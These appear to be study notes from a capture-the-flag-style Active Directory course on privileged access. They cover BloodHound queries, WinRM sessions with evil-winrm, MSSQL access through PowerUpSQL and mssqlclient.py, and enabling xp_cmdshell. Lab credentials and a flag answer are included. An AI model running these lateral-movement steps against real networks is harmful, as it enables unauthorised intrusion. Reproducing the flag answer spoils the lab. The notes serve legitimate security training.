# Privileged Access

## Remote Desktop Protocol (RDP) | Bloodhound : CanRDP

Bloodhound : CanRDP

Enumerating the Remote Desktop Users Group
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN

--> all domain users can RDP to this host

Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound
Node Info > Execution Rights

Checking Remote Access Rights using BloodHound
Analysis 
> Find Workstations where Domain Users can RDP
> Find Servers where Domain Users can RDP

Tools :
xfreerdp
Remmina
mstsc.exe

## PSRemoting or Windows Remote Management (WinRM) | Bloodhound : CanPSRemote

Bloodhound : CanPSRemote

Enumerating the Remote Management Users Group
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\forend
SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
IsGroup      : False
IsDomain     : UNKNOWN

Custom Cypher Query in Bloodhound
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

### Establishing WinRM Session from Windows
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
PS C:\htb> 

### Establishing WinRM Session from Linux
gem install evil-winrm
evil-winrm
evil-winrm -i 10.129.201.234 -u forend
Enter Password: 
after evil-winrm established : upload/download file from hosting VM


## MSSQL Server | Bloodhound : SQLAdmin

Bloodhound : SQLAdmin

Find SQL credentials : Snaffler to find web.config

Custom Cypher Query in Bloodhound
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2

### Enumerating MSSQL Instances with PowerUpSQL
cd .\PowerUpSQL\
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain

ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/6/2022 11:59 AM

Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
Column1
-------
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...

### mssqlclient.py

Displaying mssqlclient.py Options
mssqlclient.py

Running mssqlclient.py Against the Target
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth

SQL> help

Choosing enable_xp_cmdshell
SQL> enable_xp_cmdshell

Enumerating our Rights on the System using xp_cmdshell
xp_cmdshell whoami /priv

## LAB

xfreerdp /u:htb-student /p:"Academy_student_AD!" /v:$TARGET

PS C:\Windows\system32> hostname
ACADEMY-EA-MS01

cd c:\tools
Import-Module .\PowerView.ps1
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

Get-DomainGroup -Identity "Remote Management Users" | select memberof

.\SharpHound.exe -c All --zipfilename ILFREIGHT
bloodhound
Upload Data
domain : INLANEFREIGHT

Raw query 
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

bdavis ---CanPSRemote---> ACADEMY-EA-DC01 



xfreerdp /u:damundsen /v:$TARGET
SQL1234!



cd c:\tools
cd .\PowerUpSQL\
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain

ssh htb-student@172.16.5.225
HTB_@cademy_stdnt!

mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
SQL1234!

SQL> enable_xp_cmdshell
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.

xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt
output

--------------------------------------------------------------------------------

1m_the_sQl_@dm1n_n0w!